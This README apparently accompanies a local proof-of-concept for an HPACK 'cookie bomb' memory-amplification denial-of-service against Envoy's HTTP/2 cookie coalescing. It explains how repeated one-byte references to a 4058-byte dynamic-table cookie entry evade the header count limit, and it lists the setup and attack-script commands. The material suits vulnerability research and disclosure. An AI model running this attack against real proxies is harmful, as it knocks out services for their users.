# Envoy HPACK Cookie Bomb Repro

This repro targets the HTTP/2 cookie coalescing path in Envoy. Non-cookie HPACK
reference bombs hit Envoy's default `max_headers_count=100`; repeated `cookie`
fields are first appended into a per-stream `cookies_` buffer and are inserted
as one final `cookie` header at end-of-headers.

See `AMPLIFICATION.md` for the exact wire-to-memory math and measured local
RSS amplification.

## Setup

```bash
cd /home/pop/sec/hpack/repro
./setup_certs.sh
podman pull docker.io/envoyproxy/envoy:v1.37-latest
./run_envoy.sh
podman run --rm docker.io/envoyproxy/envoy:v1.37-latest envoy --version
```

## Monitor

```bash
cd /home/pop/sec/hpack/repro
./monitor_rss.py --name envoy-hpack-cookie
```

## PoC

Conservative single-stream run:

```bash
cd /home/pop/sec/hpack/repro
./hpack_cookie_bomb.py --connections 1 --streams 1 --refs 8192 --hold 30
```

Higher amplification per stream:

```bash
cd /home/pop/sec/hpack/repro
./hpack_cookie_bomb.py --connections 1 --streams 1 --refs 32768 --hold 60
```

The header block inserts one dynamic table entry `cookie: <4058 bytes>`, then
uses one-byte indexed references to dynamic index 62. `--initial-window 0`
prevents response DATA from draining immediately; Envoy's default
`stream_flush_timeout` still bounds the hold.
